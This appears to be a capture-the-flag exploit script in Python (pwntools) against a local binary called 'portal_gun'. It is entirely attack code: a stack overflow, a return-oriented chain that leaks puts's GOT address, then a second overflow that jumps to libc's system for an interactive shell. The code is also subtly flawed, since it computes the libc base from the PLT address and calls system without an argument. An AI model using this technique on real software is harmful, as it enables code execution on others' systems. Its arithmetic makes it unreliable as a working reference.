from pwn import *
from struct import pack
import time
context.log_level = 'DEBUG'
r=process('./portal_gun')
e = ELF('./portal_gun')
lib=ELF('./libc.so.6')
# 0x00000000004007a3 : pop rdi ; ret

puts_plt = 0x400560
puts_got = 0x601018
pop_rdi = 0x0004007a3
main=0x4006fb
print(hex(e.symbols['puts']), hex(e.got['puts']),hex(e.plt['puts']))

raw_input(':')

payload='a'*(0x70+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

# log.info(payload+'\n')

r.sendlineafter("?", payload)
r.recvline()
recv_puts = u64(r.recvline()[:-1].ljust(8, b'\x00'))
libc_base = recv_puts-puts_plt
print(recv_puts)
print(libc_base)

libc_system = libc_base+lib.symbols['system']
print(libc_system)
r.sendlineafter('?','a'*(0x70+8)+p64(libc_system))
r.interactive()
